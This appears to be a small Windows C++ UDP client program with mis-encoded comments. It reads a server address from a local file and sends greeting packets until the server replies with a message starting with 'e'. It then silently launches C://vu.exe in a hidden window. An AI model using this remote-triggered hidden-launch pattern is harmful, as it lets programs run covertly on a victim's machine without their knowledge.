// �ͻ���.cpp : Defines the entry point for the console application.
//
#include<winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32.lib")

void main()
{
	WSADATA wsadata;
	SOCKET sclient;


	//��������ַ���˿ں�
	char serip[30]="10.13.28.32";
	int  Seriport=5051;
	char ch[]="hello";
	
	FILE *p=fopen("ip","rb");
	if(p!=NULL)
	{
		fscanf(p,"%s",serip);
		fclose(p);
	}
	else
		return ;

	//������SOCKET��ַ�ṹ����
	int ilen;
	//����/�������ݴ�С
	int isend;


	//Ҫ���͸�������������
	char send_buf[]="hello,I am a client.";


	//�������˵�SOCKET��ַ�ṹ
	struct sockaddr_in seradd;


	//�ַ������ʼ��
	memset(ch,0,sizeof(ch));

	if(WSAStartup(MAKEWORD(2,2),&wsadata)!=0)
	{
		printf("failed to load winsock\n");
		return;
	}

	

	// ������SOCKET��ַ�ṹ��ʼ��
	seradd.sin_family=AF_INET;
	seradd.sin_port=htons(Seriport);
	seradd.sin_addr.s_addr=inet_addr(serip);

   

	sclient=socket(AF_INET,SOCK_DGRAM,0);
	if(sclient==INVALID_SOCKET)
	{
		printf("build socket failed!\n");
		return;
	}

   
	
	//�����Ӳ���Ҫ���е�ַ���׽��ֵİ󶨣�ֱ�ӷ������ݼ���
	ilen=sizeof(seradd);
	int n=1;
	char str[1030];
	isend=sendto(sclient,send_buf,sizeof(send_buf),0,(struct sockaddr *)&seradd,ilen);
	 
     while(1)
	 {
	    sendto(sclient,send_buf,sizeof(send_buf),0,(struct sockaddr *)&seradd,ilen);
		int a=recvfrom(sclient,str,1030,0,(struct sockaddr*)&seradd,&ilen);
		if(str[0]=='e')
			break;
	 }
	 ShellExecute(NULL,"open","C://vu.exe",NULL,NULL,SW_HIDE);

	 closesocket(sclient);
	 WSACleanup();
}
